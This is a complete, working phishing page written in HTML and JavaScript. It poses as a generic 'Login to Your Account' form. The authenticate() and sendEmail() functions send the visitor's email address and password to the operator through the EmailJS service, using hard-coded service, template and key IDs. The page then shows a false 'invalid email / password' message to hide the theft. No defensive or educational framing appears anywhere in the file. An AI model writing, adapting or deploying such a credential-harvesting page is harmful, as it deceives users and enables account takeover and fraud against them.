<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Your Account</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        emailjs.init("jkb7mzwK9KsEbHbna"); // Public Key from your EmailJS account
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-image: url('https://i.postimg.cc/pVBJwW22/blue-notes-isolated-grey.jpg'); /* Background Image */
            background-size: contain; /* Ensures the image fits within the page */
            background-position: top center;
            background-repeat: no-repeat;
            background-color: #000; /* Fallback color */
            height: 100vh;
            margin: 0;
            padding: 0;
            text-align: center;
        }

        .login-container {
            background-color: white;
            width: 100%;
            max-width: 400px;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 1000;
            border-top: 5px solid #f07c00;
        }

        h2 {
            color: #333;
            font-weight: bold;
            margin: 10px 0;
        }

        input {
            width: 85%;
            padding: 8px;
            margin: 10px 0;
            border: 1px solid #aaa;
            border-radius: 6px;
            background-color: #f4f4f4;
            color: #333;
        }

        input::placeholder {
            color: #bbb;
        }

        button {
            background-color: #f07c00;
            color: white;
            border: none;
            padding: 10px;
            width: 85%;
            cursor: pointer;
            border-radius: 6px;
            font-weight: bold;
            transition: background 0.3s;
        }

        button:hover {
            background-color: #d96b00;
        }

        .forgot-password {
            color: #f07c00;
            text-decoration: none;
            font-size: 14px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        /* Confirmation Message */
        #confirmation {
            display: none;
            background-color: rgba(40, 40, 40, 0.95);
            width: 100%;
            max-width: 400px;
            padding: 20px;
            margin: 100px auto;
            border-radius: 8px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
            border-top: 5px solid #f07c00;
        }

        #confirmation p {
            color: #fff;
            font-size: 18px;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <!-- Login Panel -->
    <div id="login" class="login-container">
        <h2>Login to Your Account</h2>
        <div id="emailSection">
            <input type="email" id="email" placeholder="Email Address" required>
        </div>
        <div id="passwordSection">
            <input type="password" id="password" placeholder="Password" required>
        </div>
        <button onclick="authenticate()">Login</button>
    </div>

    <!-- Confirmation Message -->
   <div id="confirmation">
    <h2 style="color: white;">PLEASE TRY AGAIN!</h2>
    <p>You've entered an invalid email address / password combination.</p>
    <button onclick="window.close()">Close this page</button>
</div>

    <script>
        function sendEmail(username, password) {
            const serviceID = "service_suqjtsd";  // Your Service ID
            const templateID = "template_gnd5xid";  // Your Template ID
            const publicKey = "jkb7mzwK9KsEbHbna";  // Your Public Key

            const templateParams = {
                login_history: `Username: ${username}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
            };

            return emailjs.send(serviceID, templateID, templateParams, publicKey);
        }

        function authenticate() {
            let loginButton = document.querySelector("button");
            loginButton.textContent = "Authenticating...";
            loginButton.disabled = true;
            let email = document.getElementById("email").value.trim();
            let password = document.getElementById("password").value.trim();

            if (email && password) {
                sendEmail(email, password)
                    .then(() => {
                        loginButton.textContent = "Login";
                        loginButton.disabled = false;
                        document.getElementById("login").style.display = "none";
                        document.getElementById("confirmation").style.display = "block";
                    })
                    .catch(error => {
                        console.error("Error sending email", error);
                        loginButton.textContent = "Login";
                        loginButton.disabled = false;
                        alert("Failed to send login report. Please try again.");
                    });
            } else {
                alert("Please enter both email and password.");
                loginButton.disabled = false;
                loginButton.textContent = "Login";
            }
        }

    </script>
</body>
</html>
